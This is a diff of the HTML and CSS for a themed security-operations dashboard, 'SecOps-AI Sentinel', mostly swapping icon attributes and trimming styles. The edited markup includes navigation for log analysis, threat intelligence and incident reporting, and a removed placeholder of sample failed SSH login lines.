@@ -4,16 +4,11 @@
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
 <title>SecOps-AI Sentinel v2.0 | Black Hat Edition</title>
-<link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%2300FF9C' stroke-width='2'><path d='M12 2L2 7l10 5 10-5-10-5z'/><path d='M2 17l10 5 10-5'/><path d='M2 12l10 5 10-5'/></svg>" />
 <script src="https://cdn.tailwindcss.com"></script>
-<script src="https://unpkg.com/lucide@latest"></script>
 <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
 <style>
 @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700;800&family=Space+Mono:wght@400;700&display=swap');
 
-/* ============================================================
-   DESIGN TOKENS & RESPONSIVE RESET
-============================================================ */
 :root {
   --bg-0: #000000;
   --bg-1: #05080A;
@@ -27,11 +22,8 @@
   --red: #FF2E63;
   --red-glow: rgba(255, 46, 99, 0.45);
   --amber: #FFB627;
-  --amber-glow: rgba(255, 182, 39, 0.4);
   --cyan: #00E5FF;
-  --cyan-glow: rgba(0, 229, 255, 0.45);
   --purple: #B794F6;
-  --purple-glow: rgba(183, 148, 246, 0.4);
   --text-0: #E6EDF3;
   --text-1: #8B949E;
   --text-2: #484F58;
@@ -59,11 +51,8 @@ html, body {
   font-size: 13px;
   line-height: 1.55;
   -webkit-font-smoothing: antialiased;
-  -webkit-tap-highlight-color: transparent;
-  user-select: none;
 }
 
-/* CRT SCANLINE & VIGNETTE EFFECT */
 #matrixCanvas {
   position: fixed;
   top: 0; left: 0;
@@ -75,10 +64,7 @@ html, body {
 body::before {
   content: '';
   position: fixed; inset: 0;
-  background: repeating-linear-gradient(0deg,
-    rgba(0, 255, 156, 0.02) 0px,
-    rgba(0, 255, 156, 0.02) 1px,
-    transparent 1px, transparent 3px);
+  background: repeating-linear-gradient(0deg, rgba(0, 255, 156, 0.02) 0px, rgba(0, 255, 156, 0.02) 1px, transparent 1px, transparent 3px);
   pointer-events: none;
   z-index: 1;
 }
@@ -90,7 +76,6 @@ body::after {
   z-index: 2;
 }
 
-/* APP WRAPPER */
 .app {
   position: relative;
   z-index: 3;
@@ -101,41 +86,21 @@ body::after {
   overflow: hidden;
 }
 
-/* SCROLLBARS */
 ::-webkit-scrollbar { width: 5px; height: 5px; }
 ::-webkit-scrollbar-track { background: rgba(0, 0, 0, 0.5); }
-::-webkit-scrollbar-thumb {
-  background: linear-gradient(180deg, var(--green), var(--cyan));
-  border-radius: 3px;
-}
-::-webkit-scrollbar-thumb:hover { background: var(--green); }
+::-webkit-scrollbar-thumb { background: linear-gradient(180deg, var(--green), var(--cyan)); border-radius: 3px; }
 
-/* SIDEBAR */
 .sidebar {
   width: var(--sidebar-w);
   background: linear-gradient(180deg, rgba(6, 10, 14, 0.98), rgba(2, 4, 6, 0.99));
   border-right: 1px solid var(--border);
   display: flex;
   flex-direction: column;
-  transition: width 0.25s cubic-bezier(0.4, 0, 0.2, 1), transform 0.25s cubic-bezier(0.4, 0, 0.2, 1);
+  transition: width 0.25s ease, transform 0.25s ease;
   position: relative;
-  z-index: 40;
+  z-index: 50;
   flex-shrink: 0;
 }
-.sidebar::before {
-  content: '';
-  position: absolute;
-  top: 0; right: 0;
-  width: 1px; height: 100%;
-  background: linear-gradient(180deg, transparent, var(--green), transparent);
-  animation: scanLine 3.5s ease-in-out infinite;
-  pointer-events: none;
-}
-@keyframes scanLine {
-  0%, 100% { opacity: 0.2; }
-  50% { opacity: 1; }
-}
-
 .sidebar.collapsed { width: var(--sidebar-collapsed); }
 .sidebar.collapsed .nav-label,
 .sidebar.collapsed .brand-text,
@@ -146,36 +111,15 @@ body::after {
 .sidebar.collapsed .brand { justify-content: center; padding: 14px 0; }
 .sidebar.collapsed .status-inner { justify-content: center; padding: 10px; }
 
-@media (min-width: 768px) and (max-width: 1024px) {
-  .sidebar { width: var(--sidebar-collapsed); }
-  .sidebar .nav-label,
-  .sidebar .brand-text,
-  .sidebar .section-label,
-  .sidebar .status-text,
-  .sidebar .nav-badge { display: none; }
-  .sidebar .nav-item { justify-content: center; padding: 12px; }
-  .sidebar .brand { justify-content: center; padding: 14px 0; }
-  .sidebar .status-inner { justify-content: center; padding: 10px; }
-}
-
 @media (max-width: 767px) {
   .sidebar {
     position: fixed;
     top: 0; left: 0; bottom: 0;
-    width: 270px !important;
-    max-width: 85vw;
+    width: 260px !important;
     transform: translateX(-105%);
     box-shadow: 6px 0 50px rgba(0, 0, 0, 0.95);
-    z-index: 100;
   }
   .sidebar.open { transform: translateX(0); }
-  .sidebar .nav-label,
-  .sidebar .brand-text,
-  .sidebar .section-label,
-  .sidebar .status-text { display: block !important; }
-  .sidebar .nav-item { justify-content: flex-start !important; padding: 11px 14px !important; }
-  .sidebar .brand { justify-content: flex-start !important; padding: 16px !important; }
-  .sidebar .status-inner { justify-content: flex-start !important; }
 }
 
 .sidebar-overlay {
@@ -184,12 +128,12 @@ body::after {
   inset: 0;
   background: rgba(0, 0, 0, 0.82);
   backdrop-filter: blur(5px);
-  -webkit-backdrop-filter: blur(5px);
-  z-index: 99;
+  z-index: 45;
 }
-.sidebar-overlay.show { display: block; }
+@media (max-width: 767px) {
+  .sidebar-overlay.show { display: block; }
+}
 
-/* BRAND */
 .brand {
   display: flex;
   align-items: center;
@@ -214,20 +158,15 @@ body::after {
   font-weight: 800;
   color: var(--text-0);
   letter-spacing: 0.5px;
-  text-shadow: 0 0 10px var(--green-glow);
-  white-space: nowrap;
 }
 .brand-title .accent { color: var(--green); }
 .brand-version {
   font-size: 9px;
   color: var(--text-2);
   letter-spacing: 2px;
-  margin-top: 1px;
   text-transform: uppercase;
-  white-space: nowrap;
 }
 
-/* NAV */
 .nav {
   flex: 1;
   overflow-y: auto;
@@ -256,18 +195,17 @@ body::after {
   white-space: nowrap;
   border: 1px solid transparent;
   min-height: 38px;
+  user-select: none;
 }
-@media (hover: hover) {
-  .nav-item:hover {
-    background: rgba(0, 255, 156, 0.05);
-    color: var(--text-0);
-    border-color: rgba(0, 255, 156, 0.15);
-  }
+.nav-item:hover {
+  background: rgba(0, 255, 156, 0.06);
+  color: var(--text-0);
+  border-color: rgba(0, 255, 156, 0.2);
 }
 .nav-item.active {
-  background: linear-gradient(90deg, rgba(0, 255, 156, 0.12), transparent);
+  background: linear-gradient(90deg, rgba(0, 255, 156, 0.14), transparent);
   color: var(--green);
-  border-color: rgba(0, 255, 156, 0.35);
+  border-color: rgba(0, 255, 156, 0.4);
   box-shadow: inset 0 0 15px rgba(0, 255, 156, 0.05);
 }
 .nav-item.active::before {
@@ -289,7 +227,6 @@ body::after {
   color: #fff;
 }
 
-/* SYSTEM STATUS BOX */
 .status-box {
   padding: 12px;
   border-top: 1px solid var(--border);
@@ -323,7 +260,6 @@ body::after {
   letter-spacing: 1px;
 }
 
-/* MAIN VIEW CONTAINER */
 .main {
   flex: 1;
   min-width: 0;
@@ -333,7 +269,6 @@ body::after {
   position: relative;
 }
 
-/* TOPBAR */
 .topbar {
   height: var(--topbar-h);
   display: flex;
@@ -343,10 +278,8 @@ body::after {
   border-bottom: 1px solid var(--border);
   background: rgba(5, 8, 10, 0.88);
   backdrop-filter: blur(14px);
-  -webkit-backdrop-filter: blur(14px);
   flex-shrink: 0;
   gap: 12px;
-  position: relative;
   z-index: 30;
 }
 .topbar-left {
@@ -374,7 +307,6 @@ body::after {
   color: var(--green);
   box-shadow: 0 0 12px rgba(0, 255, 156, 0.25);
 }
-.icon-btn:active { transform: scale(0.95); }
 
 .page-title {
   font-size: 14px;
@@ -387,7 +319,6 @@ body::after {
   color: var(--text-2);
   white-space: nowrap;
 }
-@media (max-width: 500px) { .page-subtitle { display: none; } }
 
 .topbar-right {
   display: flex;
@@ -403,7 +334,6 @@ body::after {
   background: rgba(0, 0, 0, 0.6);
   border: 1px solid var(--border);
   border-radius: 8px;
-  transition: all 0.15s;
 }
 .search-box:focus-within {
   border-color: var(--green);
@@ -428,13 +358,6 @@ body::after {
 }
 @media (max-width: 900px) { .search-box { display: none; } }
 
-.mobile-menu-btn { display: none; }
-@media (max-width: 767px) {
-  .mobile-menu-btn { display: flex; }
-  .desktop-menu-btn { display: none; }
-}
-
-/* CONTENT CONTAINER */
 .content {
   flex: 1;
   width: 100%;
@@ -442,27 +365,22 @@ body::after {
   overflow-x: hidden;
   padding: var(--content-pad);
   position: relative;
-  -webkit-overflow-scrolling: touch;
-  user-select: text;
 }
 .view {
   width: 100%;
   max-width: 1400px;
   margin: 0 auto;
-  animation: viewFade 0.25s ease;
+  animation: viewFade 0.2s ease;
 }
 @keyframes viewFade {
-  from { opacity: 0; transform: translateY(5px); }
+  from { opacity: 0; transform: translateY(4px); }
   to { opacity: 1; transform: translateY(0); }
 }
 
-/* PANELS */
 .panel {
   background: linear-gradient(180deg, rgba(13, 17, 23, 0.94), rgba(5, 8, 10, 0.96));
   border: 1px solid var(--border);
   border-radius: 11px;
-  backdrop-filter: blur(12px);
-  -webkit-backdrop-filter: blur(12px);
   position: relative;
   overflow: hidden;
 }
@@ -473,7 +391,6 @@ body::after {
   width: 100%; height: 1px;
   background: linear-gradient(90deg, transparent, var(--green), transparent);
   opacity: 0.35;
-  pointer-events: none;
 }
 .panel-header {
   padding: 12px 18px;
@@ -491,13 +408,11 @@ body::after {
   display: flex;
   align-items: center;
   gap: 8px;
-  letter-spacing: 0.5px;
 }
 .panel-title svg { color: var(--green); flex-shrink: 0; }
 .panel-body { padding: 18px; }
 @media (max-width: 640px) { .panel-body { padding: 12px; } }
 
-/* BUTTONS */
 .btn {
   display: inline-flex;
   align-items: center;
@@ -517,7 +432,6 @@ body::after {
   min-height: 36px;
 }
 .btn:disabled { opacity: 0.45; cursor: not-allowed; }
-.btn:active:not(:disabled) { transform: scale(0.97); }
 .btn-primary {
   background: linear-gradient(135deg, var(--green), var(--green-dim));
   color: #000;
@@ -525,14 +439,11 @@ body::after {
 }
 .btn-primary:hover:not(:disabled) {
   box-shadow: 0 0 26px rgba(0, 255, 156, 0.55);
-  transform: translateY(-1px);
 }
 .btn-danger {
   background: linear-gradient(135deg, var(--red), #C20038);
   color: #fff;
-  box-shadow: 0 0 18px rgba(255, 46, 99, 0.35);
 }
-.btn-danger:hover:not(:disabled) { box-shadow: 0 0 28px rgba(255, 46, 99, 0.6); }
 .btn-ghost {
   background: rgba(0, 255, 156, 0.04);
   border-color: var(--border);
@@ -545,7 +456,6 @@ body::after {
 }
 .btn-sm { padding: 5px 10px; font-size: 10.5px; min-height: 30px; }
 
-/* STATS CARDS */
 .stat-grid {
   display: grid;
   grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
@@ -557,13 +467,6 @@ body::after {
   border-radius: 11px;
   background: linear-gradient(180deg, rgba(13, 17, 23, 0.9), rgba(5, 8, 10, 0.6));
   border: 1px solid var(--border);
-  position: relative;
-  overflow: hidden;
-  transition: all 0.2s;
-}
-.stat:hover {
-  border-color: var(--border-2);
-  transform: translateY(-2px);
 }
 .stat-label {
   font-size: 9.5px;
@@ -577,15 +480,13 @@ body::after {
   font-weight: 800;
   color: var(--text-0);
   margin-top: 4px;
-  letter-spacing: -0.5px;
 }
 .stat-value.accent-green { color: var(--green); text-shadow: 0 0 15px var(--green-glow); }
-.stat-value.accent-cyan { color: var(--cyan); text-shadow: 0 0 15px var(--cyan-glow); }
+.stat-value.accent-cyan { color: var(--cyan); }
 .stat-value.accent-red { color: var(--red); text-shadow: 0 0 15px var(--red-glow); }
-.stat-value.accent-purple { color: var(--purple); text-shadow: 0 0 15px var(--purple-glow); }
+.stat-value.accent-purple { color: var(--purple); }
 .stat-meta { font-size: 10px; color: var(--text-1); margin-top: 3px; }
 
-/* TERMINAL VIEW */
 .terminal {
   background: #000;
   border: 1px solid var(--border);
@@ -625,9 +526,6 @@ body::after {
 .term-line.warn { color: var(--amber); }
 .term-line.info { color: var(--cyan); }
 .term-line.dim { color: var(--text-1); }
-.term-line .user { color: var(--green); font-weight: 700; }
-.term-line .path { color: var(--cyan); }
-.term-line .cmd { color: var(--text-0); }
 .term-input-row {
   display: flex;
   align-items: center;
@@ -648,7 +546,6 @@ body::after {
   caret-color: var(--green);
 }
 
-/* INPUT CONTROLS */
 .input, .textarea, .select {
   width: 100%;
   background: rgba(0, 0, 0, 0.7);
@@ -659,14 +556,12 @@ body::after {
   font-size: 12.5px;
   font-family: inherit;
   outline: none;
-  transition: all 0.15s;
 }
 .input:focus, .textarea:focus, .select:focus {
   border-color: var(--green);
   box-shadow: 0 0 15px rgba(0, 255, 156, 0.15);
   background: rgba(0, 0, 0, 0.9);
 }
-.input::placeholder, .textarea::placeholder { color: var(--text-2); }
 .textarea {
   font-family: 'JetBrains Mono', monospace;
   font-size: 12px;
@@ -686,7 +581,6 @@ body::after {
 }
 .field-row { margin-bottom: 14px; }
 
-/* BADGES */
 .badge {
   display: inline-flex;
   align-items: center;
@@ -698,7 +592,6 @@ body::after {
   letter-spacing: 0.8px;
   text-transform: uppercase;
   border: 1px solid;
-  white-space: nowrap;
 }
 .badge-green { background: rgba(0, 255, 156, 0.08); color: var(--green); border-color: rgba(0, 255, 156, 0.35); }
 .badge-red { background: rgba(255, 46, 99, 0.08); color: var(--red); border-color: rgba(255, 46, 99, 0.35); }
@@ -707,14 +600,10 @@ body::after {
 .badge-purple { background: rgba(183, 148, 246, 0.08); color: var(--purple); border-color: rgba(183, 148, 246, 0.35); }
 .badge-gray { background: rgba(139, 148, 158, 0.08); color: var(--text-1); border-color: var(--border); }
 
-/* RESPONSIVE AUTO-FIT GRIDS */
 .grid-2 {
   display: grid;
   grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
   gap: 14px;
-}
-@media (max-width: 480px) {
-  .grid-2 { grid-template-columns: 1fr; }
 }
 .grid-3 {
   display: grid;
@@ -722,14 +611,12 @@ body::after {
   gap: 12px;
 }
 
-/* RADAR CANVAS */
 #radarCanvas {
   width: 100%;
   height: 100%;
   display: block;
 }
 
-/* CODE CONTAINER */
 .code-out {
   background: #000;
   border: 1px solid var(--border);
@@ -745,34 +632,20 @@ body::after {
   overflow-y: auto;
   position: relative;
 }
-.code-out::before {
-  content: '▶ TERMINAL TELEMETRY';
-  position: absolute;
-  top: 6px; right: 10px;
-  font-size: 8.5px;
-  color: var(--text-2);
-  letter-spacing: 1.5px;
-  background: rgba(0, 0, 0, 0.85);
-  padding: 2px 6px;
-  border-radius: 3px;
-}
 
-/* DROPZONE */
 .dropzone {
-  padding: 32px 16px;
+  padding: 28px 16px;
   border: 2px dashed var(--border-2);
   border-radius: 10px;
   text-align: center;
   cursor: pointer;
-  transition: all 0.2s;
   background: rgba(0, 0, 0, 0.35);
 }
-.dropzone:hover, .dropzone.drag {
+.dropzone:hover {
   border-color: var(--green);
   background: rgba(0, 255, 156, 0.04);
 }
 
-/* TOASTS */
 .toast-wrap {
   position: fixed;
   top: calc(var(--topbar-h) + 12px);
@@ -790,7 +663,6 @@ body::after {
   border-radius: 9px;
   background: rgba(5, 8, 10, 0.98);
   border: 1px solid var(--border-2);
-  box-shadow: 0 10px 30px rgba(0,0,0,0.85);
   display: flex;
   align-items: flex-start;
   gap: 10px;
@@ -798,12 +670,7 @@ body::after {
   position: relative;
   overflow: hidden;
 }
-.toast::before {
-  content: '';
-  position: absolute;
-  left: 0; top: 0; bottom: 0;
-  width: 3px;
-}
+.toast::before { content: ''; position: absolute; left: 0; top: 0; bottom: 0; width: 3px; }
 .toast.success::before { background: var(--green); }
 .toast.error::before { background: var(--red); }
 .toast.warn::before { background: var(--amber); }
@@ -811,7 +678,6 @@ body::after {
 .toast-title { font-size: 11.5px; font-weight: 700; color: var(--text-0); }
 .toast-msg { font-size: 11px; color: var(--text-1); margin-top: 2px; }
 
-/* MODALS */
 .modal-bg {
   position: fixed; inset: 0;
   background: rgba(0, 0, 0, 0.88);
@@ -831,10 +697,8 @@ body::after {
   max-height: 85vh;
   display: flex;
   flex-direction: column;
-  box-shadow: 0 20px 60px rgba(0,0,0,0.9), 0 0 30px rgba(0, 255, 156, 0.1);
 }
 
-/* HEX STYLES */
 .hex-row {
   display: grid;
   grid-template-columns: 85px 1fr 120px;
@@ -842,15 +706,10 @@ body::after {
   padding: 3px 6px;
   font-size: 11px;
 }
-@media (max-width: 640px) {
-  .hex-row { grid-template-columns: 70px 1fr; }
-  .hex-ascii { display: none; }
-}
 .hex-off { color: var(--text-2); }
 .hex-bytes { color: var(--cyan); letter-spacing: 1px; }
 .hex-ascii { color: var(--amber); }
 
-/* TABS */
 .tab-bar {
   display: flex;
   gap: 4px;
@@ -870,26 +729,13 @@ body::after {
   border-radius: 5px;
   cursor: pointer;
   white-space: nowrap;
-  letter-spacing: 0.5px;
 }
 .tab-btn.active {
   color: var(--green);
   background: rgba(0, 255, 156, 0.12);
 }
 
-/* UTILITY HELPERS */
 .hidden { display: none !important; }
-.progress {
-  height: 5px;
-  background: rgba(139, 148, 158, 0.15);
-  border-radius: 999px;
-  overflow: hidden;
-}
-.progress-bar {
-  height: 100%;
-  border-radius: 999px;
-  transition: width 0.5s ease;
-}
 .icon-wrap {
   width: 32px; height: 32px;
   border-radius: 7px;
@@ -922,7 +768,7 @@ body::after {
   <aside class="sidebar" id="sidebar">
     <div class="brand">
       <div class="brand-logo">
-        <i data-lucide="shield-alert" style="width:20px;height:20px;"></i>
+        <i data-icon="shield-alert" style="width:20px;height:20px;"></i>
       </div>
       <div class="brand-text">
         <div class="brand-title">Sec<span class="accent">Ops</span>AI</div>
@@ -933,63 +779,63 @@ body::after {
     <nav class="nav">
       <div class="section-label">⚡ Operations</div>
       <div class="nav-item active" data-view="dashboard" onclick="switchView('dashboard')">
-        <i data-lucide="layout-dashboard" style="width:16px;height:16px;"></i>
+        <i data-icon="layout-dashboard" style="width:16px;height:16px;"></i>
         <span class="nav-label">Mission Control</span>
       </div>
       <div class="nav-item" data-view="terminal" onclick="switchView('terminal')">
-        <i data-lucide="terminal" style="width:16px;height:16px;"></i>
+        <i data-icon="terminal" style="width:16px;height:16px;"></i>
         <span class="nav-label">Terminal Shell</span>
       </div>
       <div class="nav-item" data-view="analyzer" onclick="switchView('analyzer')">
-        <i data-lucide="scan-line" style="width:16px;height:16px;"></i>
+        <i data-icon="scan-line" style="width:16px;height:16px;"></i>
         <span class="nav-label">Log Analyzer</span>
       </div>
       <div class="nav-item" data-view="recon" onclick="switchView('recon')">
-        <i data-lucide="radar" style="width:16px;height:16px;"></i>
+        <i data-icon="radar" style="width:16px;height:16px;"></i>
         <span class="nav-label">Recon Scanner</span>
       </div>
 
       <div class="section-label">🔧 Toolkit</div>
       <div class="nav-item" data-view="payload" onclick="switchView('payload')">
-        <i data-lucide="bomb" style="width:16px;height:16px;"></i>
+        <i data-icon="bomb" style="width:16px;height:16px;"></i>
         <span class="nav-label">Payload Builder</span>
       </div>
       <div class="nav-item" data-view="encoder" onclick="switchView('encoder')">
-        <i data-lucide="binary" style="width:16px;height:16px;"></i>
+        <i data-icon="binary" style="width:16px;height:16px;"></i>
         <span class="nav-label">Encoder Lab</span>
       </div>
       <div class="nav-item" data-view="hash" onclick="switchView('hash')">
-        <i data-lucide="hash" style="width:16px;height:16px;"></i>
+        <i data-icon="hash" style="width:16px;height:16px;"></i>
         <span class="nav-label">Hash Generator</span>
       </div>
 
       <div class="section-label">🛡️ Threat Intel</div>
       <div class="nav-item" data-view="mitre" onclick="switchView('mitre')">
-        <i data-lucide="crosshair" style="width:16px;height:16px;"></i>
+        <i data-icon="crosshair" style="width:16px;height:16px;"></i>
         <span class="nav-label">MITRE ATT&CK</span>
         <span class="nav-badge hidden" id="navMitreBadge">0</span>
       </div>
       <div class="nav-item" data-view="ioc" onclick="switchView('ioc')">
-        <i data-lucide="fingerprint" style="width:16px;height:16px;"></i>
+        <i data-icon="fingerprint" style="width:16px;height:16px;"></i>
         <span class="nav-label">IoC Vault</span>
         <span class="nav-badge hidden" id="navIocBadge">0</span>
       </div>
       <div class="nav-item" data-view="containment" onclick="switchView('containment')">
-        <i data-lucide="shield-check" style="width:16px;height:16px;"></i>
+        <i data-icon="shield-check" style="width:16px;height:16px;"></i>
         <span class="nav-label">Containment</span>
       </div>
       <div class="nav-item" data-view="report" onclick="switchView('report')">
-        <i data-lucide="file-text" style="width:16px;height:16px;"></i>
+        <i data-icon="file-text" style="width:16px;height:16px;"></i>
         <span class="nav-label">Incident Report</span>
       </div>
 
       <div class="section-label">📦 System</div>
       <div class="nav-item" data-view="export" onclick="switchView('export')">
-        <i data-lucide="download" style="width:16px;height:16px;"></i>
+        <i data-icon="download" style="width:16px;height:16px;"></i>
         <span class="nav-label">STIX 2.1 Export</span>
       </div>
       <div class="nav-item" data-view="settings" onclick="switchView('settings')">
-        <i data-lucide="settings" style="width:16px;height:16px;"></i>
+        <i data-icon="settings" style="width:16px;height:16px;"></i>
         <span class="nav-label">Settings</span>
       </div>
     </nav>
@@ -1006,11 +852,8 @@ body::after {
   <main class="main">
     <div class="topbar">
       <div class="topbar-left">
-        <button class="icon-btn mobile-menu-btn" onclick="openMobileMenu()" aria-label="Open menu">
-          <i data-lucide="menu" style="width:18px;height:18px;"></i>
-        </button>
-        <button class="icon-btn desktop-menu-btn" onclick="toggleSidebar()" aria-label="Toggle sidebar">
-          <i data-lucide="panel-left" style="width:16px;height:16px;"></i>
+        <button class="icon-btn" onclick="toggleSidebar()" aria-label="Toggle sidebar">
+          <i data-icon="panel-left" style="width:16px;height:16px;"></i>
         </button>
         <div>
           <div class="page-title" id="pageTitle">Mission Control</div>
@@ -1019,12 +862,12 @@ body::after {
       </div>
       <div class="topbar-right">
         <div class="search-box">
-          <i data-lucide="search" style="width:13px;height:13px;color:var(--text-2);"></i>
+          <i data-icon="search" style="width:13px;height:13px;color:var(--text-2);"></i>
           <input type="text" id="globalSearch" placeholder="Query threat or IoC..." />
           <span class="kbd">CTRL+K</span>
         </div>
         <button class="icon-btn" onclick="showNotifications()" title="Alerts queue">
-          <i data-lucide="bell" style="width:16px;height:16px;"></i>
+          <i data-icon="bell" style="width:16px;height:16px;"></i>
         </button>
       </div>
     </div>
@@ -1060,13 +903,13 @@ body::after {
           <div class="panel">
             <div class="panel-header">
               <div class="panel-title">
-                <i data-lucide="radar" style="width:15px;height:15px;"></i>
+                <i data-icon="radar" style="width:15px;height:15px;"></i>
                 Threat Vector Radar
               </div>
               <span class="badge badge-green" id="radarStatus">MONITORING</span>
             </div>
             <div class="panel-body" style="padding:20px;text-align:center;">
-              <div style="position:relative;max-width:260px;margin:0 auto;aspect-ratio:1;">
+              <div style="position:relative;width:240px;height:240px;margin:0 auto;">
                 <canvas id="radarCanvas"></canvas>
                 <div style="position:absolute;inset:0;display:flex;align-items:center;justify-content:center;pointer-events:none;">
                   <div style="text-align:center;">
@@ -1082,21 +925,21 @@ body::after {
           <div class="panel">
             <div class="panel-header">
               <div class="panel-title">
-                <i data-lucide="activity" style="width:15px;height:15px;"></i>
+                <i data-icon="activity" style="width:15px;height:15px;"></i>
                 Live Security Telemetry Feed
               </div>
               <button class="btn btn-ghost btn-sm" onclick="clearFeed()">
-                <i data-lucide="trash-2" style="width:12px;height:12px;"></i> Clear
+                <i data-icon="trash-2" style="width:12px;height:12px;"></i> Clear
               </button>
             </div>
-            <div class="panel-body" style="max-height:300px;overflow-y:auto;" id="activityFeed">
+            <div class="panel-body" style="max-height:280px;overflow-y:auto;" id="activityFeed">
               <div class="feed-item">
                 <div class="icon-wrap">
-                  <i data-lucide="shield-check" style="width:14px;height:14px;color:var(--green);"></i>
+                  <i data-icon="shield-check" style="width:14px;height:14px;color:var(--green);"></i>
                 </div>
                 <div style="flex:1;min-width:0;">
-                  <div style="font-size:12px;font-weight:600;color:var(--text-0);">Sentinel Framework Initialized</div>
-                  <div style="font-size:10px;color:var(--text-2);">Ready to triage incoming logs and network traffic.</div>
+                  <div style="font-size:12px;font-weight:600;color:var(--text-0);">Sentinel Core Initialized</div>
+                  <div style="font-size:10px;color:var(--text-2);">Ready to process and isolate hostile vectors.</div>
                 </div>
                 <div class="num" style="font-size:10px;color:var(--text-2);" id="feedTime1">--:--:--</div>
               </div>
@@ -1107,24 +950,24 @@ body::after {
         <div class="panel">
           <div class="panel-header">
             <div class="panel-title">
-              <i data-lucide="zap" style="width:15px;height:15px;"></i>
+              <i data-icon="zap" style="width:15px;height:15px;"></i>
               Quick Fire Test Scenarios
             </div>
           </div>
           <div class="panel-body">
             <div class="grid-3">
               <button class="btn btn-ghost" style="padding:14px;flex-direction:column;gap:6px;height:auto;" onclick="quickAnalyze('ssh')">
-                <i data-lucide="terminal" style="width:22px;height:22px;color:var(--amber);"></i>
+                <i data-icon="key" style="width:22px;height:22px;color:var(--amber);"></i>
                 <div style="font-size:11.5px;font-weight:700;">SSH Brute Force</div>
                 <div style="font-size:9.5px;color:var(--text-2);">T1110.001 (Credential Access)</div>
               </button>
               <button class="btn btn-ghost" style="padding:14px;flex-direction:column;gap:6px;height:auto;" onclick="quickAnalyze('sqli')">
-                <i data-lucide="database" style="width:22px;height:22px;color:var(--red);"></i>
+                <i data-icon="database" style="width:22px;height:22px;color:var(--red);"></i>
                 <div style="font-size:11.5px;font-weight:700;">SQL Injection Attack</div>
                 <div style="font-size:9.5px;color:var(--text-2);">T1190 (Public Exploit)</div>
               </button>
               <button class="btn btn-ghost" style="padding:14px;flex-direction:column;gap:6px;height:auto;" onclick="quickAnalyze('webshell')">
-                <i data-lucide="code" style="width:22px;height:22px;color:var(--purple);"></i>
+                <i data-icon="terminal" style="width:22px;height:22px;color:var(--purple);"></i>
                 <div style="font-size:11.5px;font-weight:700;">Webshell Execution</div>
                 <div style="font-size:9.5px;color:var(--text-2);">T1059.004 (Unix Shell)</div>
               </button>
@@ -1143,18 +986,14 @@ body::after {
               <span class="term-dot green"></span>
               <span class="term-title">secops@sentinel-v2: ~/tactical</span>
               <div class="term-actions">
-                <button class="btn btn-ghost btn-sm" onclick="clearTerminal()">
-                  <i data-lucide="eraser" style="width:11px;height:11px;"></i> Clear
-                </button>
-                <button class="btn btn-ghost btn-sm" onclick="downloadTerminalLog()">
-                  <i data-lucide="download" style="width:11px;height:11px;"></i> Export Log
-                </button>
+                <button class="btn btn-ghost btn-sm" onclick="clearTerminal()">Clear</button>
+                <button class="btn btn-ghost btn-sm" onclick="downloadTerminalLog()">Export Log</button>
               </div>
             </div>
             <div class="term-body" id="termBody"></div>
             <div class="term-input-row">
               <span class="term-prompt">secops@sentinel:~#</span>
-              <input type="text" class="term-input" id="termInput" autocomplete="off" spellcheck="false" placeholder="Type 'help' or any cyber command..." />
+              <input type="text" class="term-input" id="termInput" autocomplete="off" spellcheck="false" placeholder="Type 'help' or commands..." />
             </div>
           </div>
         </div>
@@ -1166,24 +1005,16 @@ body::after {
           <div class="panel">
             <div class="panel-header">
               <div class="panel-title">
-                <i data-lucide="clipboard-type" style="width:15px;height:15px;"></i>
+                <i data-icon="scan-line" style="width:15px;height:15px;"></i>
                 Input Telemetry Stream
               </div>
               <div style="display:flex;gap:6px;">
-                <button class="btn btn-ghost btn-sm" onclick="openHex()" title="View in Hex">
-                  <i data-lucide="binary" style="width:11px;height:11px;"></i> Hex View
-                </button>
-                <button class="btn btn-ghost btn-sm" onclick="clearAnalyzer()">
-                  <i data-lucide="eraser" style="width:11px;height:11px;"></i> Clear
-                </button>
+                <button class="btn btn-ghost btn-sm" onclick="openHex()">Hex View</button>
+                <button class="btn btn-ghost btn-sm" onclick="clearAnalyzer()">Clear</button>
               </div>
             </div>
             <div class="panel-body">
-              <textarea id="logStream" class="textarea" rows="11" placeholder="# Paste system, auth, firewall, or web server logs here...
-Sep 17 04:12:01 edge-srv01 sshd[2841]: Failed password for invalid user admin from 185.220.101.5 port 41202 ssh2
-Sep 17 04:12:03 edge-srv01 sshd[2843]: Failed password for root from 185.220.101.5 port 41208 ssh2
-Sep 17 04:12:09 edge-srv01 sshd[2850]: Failed password for invalid user test from 185.220.101.5 port 41220 ssh2
-..."></textarea>
+              <textarea id="logStream" class="textarea" rows="11" placeholder="# Paste system, auth, firewall, or web server logs here..."></textarea>
               <div style="display:flex;justify-content:space-between;margin-top:6px;font-size:10.5px;color:var(--text-2);">
                 <span id="byteCount">0 bytes</span>
                 <span>Press <strong style="color:var(--green);">CTRL+ENTER</strong> to analyze</span>
@@ -1194,13 +1025,12 @@ Sep 17 04:12:09 edge-srv01 sshd[2850]: Failed password for invalid user test fro
           <div class="panel">
             <div class="panel-header">
               <div class="panel-title">
-                <i data-lucide="upload-cloud" style="width:15px;height:15px;"></i>
+                <i data-icon="file-text" style="width:15px;height:15px;"></i>
                 Telemetry File Ingestion
               </div>
             </div>
             <div class="panel-body">
               <div class="dropzone" id="dropzone" onclick="document.getElementById('fileInput').click()">
-                <i data-lucide="file-up" style="width:30px;height:30px;color:var(--green);margin:0 auto 8px;display:block;"></i>
                 <div style="font-size:12.5px;font-weight:700;">Select or Drop Log Artifact</div>
                 <div style="font-size:10.5px;color:var(--text-2);">Supports .log, .txt, .json, .csv</div>
                 <div id="uploadFileName" style="font-size:11px;color:var(--green);margin-top:8px;"></div>
@@ -1208,12 +1038,11 @@ Sep 17 04:12:09 edge-srv01 sshd[2850]: Failed password for invalid user test fro
               <input type="file" id="fileInput" hidden accept=".log,.txt,.json,.csv,text/*" />
 
               <div style="margin-top:12px;">
-                <label class="field-label">Gemini API Key (Optional for cloud LLM reasoning)</label>
+                <label class="field-label">Gemini API Key (Optional)</label>
